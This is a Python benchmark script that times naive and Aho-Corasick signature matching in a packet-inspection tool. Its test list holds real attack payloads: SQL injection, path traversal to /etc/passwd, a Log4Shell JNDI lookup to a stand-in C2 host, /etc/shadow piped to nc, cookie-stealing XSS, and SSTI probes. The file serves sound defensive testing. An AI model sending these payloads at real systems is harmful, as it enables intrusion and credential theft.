"""vGuard DPI Pattern Matching Performance Benchmark.

Compares naive O(M * N) multi-pattern looping with the O(N) Aho-Corasick
Automaton across simulated packet payloads.
"""
import time
from app.services.fast_matcher import get_fast_matcher
from rule_manager import load_attack_signatures


def naive_match(signatures_dict, payload):
    lower_payload = payload.lower()
    for cat, sigs in signatures_dict.items():
        for s in sigs:
            if s.lower() in lower_payload:
                return cat, s
    return None, None


def run_benchmark(num_iterations=5000):
    rules = load_attack_signatures()
    total_patterns = sum(len(sigs) for sigs in rules.values())
    total_categories = len(rules)

    matcher = get_fast_matcher(rules)

    test_payloads = [
        "GET /index.php?id=123&user=john_doe HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0",
        "POST /api/login HTTP/1.1\r\nHost: secure.org\r\nContent-Type: application/json\r\n\r\n{'user':'admin'}",
        "GET /search?q=%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1",
        "GET /report.jsp?path=../../../../etc/passwd HTTP/1.1\r\nHost: target.internal",
        "POST /submit HTTP/1.1\r\nUser-Agent: ${jndi:ldap://c2.malicious-domain.com/payload}\r\nHost: app",
        "GET /status?debug=1&cmd=cat%20/etc/shadow|nc%20192.168.1.50%204444 HTTP/1.1",
        "GET /test?vuln=<script>alert(document.cookie)</script> HTTP/1.1",
        "POST /actuator/env HTTP/1.1\r\nContent-Type: application/json\r\n\r\nclass.module.classLoader.URLs=x",
        "GET /view?template={{7*7}}&user=guest HTTP/1.1\r\nHost: web.corp",
        "GET /api/v1/health HTTP/1.1\r\nHost: cluster.k8s.local\r\nAccept: */*",
    ]

    total_packets = len(test_payloads) * (num_iterations // len(test_payloads))

    print("=== vGuard DPI Performance Benchmark ===")
    print(f"Signatures loaded : {total_patterns} patterns across {total_categories} attack categories")
    print(f"Payloads evaluated: {total_packets} packets\n")

    # 1. Benchmark Naive Loop
    t0 = time.perf_counter()
    naive_hits = 0
    for _ in range(num_iterations // len(test_payloads)):
        for p in test_payloads:
            cat, sig = naive_match(rules, p)
            if cat:
                naive_hits += 1
    t_naive = time.perf_counter() - t0
    naive_pps = total_packets / t_naive

    # 2. Benchmark Aho-Corasick Automaton
    t0 = time.perf_counter()
    fast_hits = 0
    for _ in range(num_iterations // len(test_payloads)):
        for p in test_payloads:
            cat, sig = matcher.search_first(p)
            if cat:
                fast_hits += 1
    t_fast = time.perf_counter() - t0
    fast_pps = total_packets / t_fast

    speedup = t_naive / t_fast if t_fast > 0 else 1.0

    print(f"1. Naive O(M*N) Scan   : {t_naive:.4f}s ({naive_pps:,.0f} packets/sec) [Hits: {naive_hits}]")
    print(f"2. Aho-Corasick O(N) DFA: {t_fast:.4f}s ({fast_pps:,.0f} packets/sec) [Hits: {fast_hits}]")
    print(f"\nThroughput Improvement : {speedup:.2f}x FASTER")
    print(f"Latency per packet     : { (t_fast / total_packets) * 1_000_000:.2f} microseconds")
    print("=========================================")


if __name__ == "__main__":
    run_benchmark(10000)
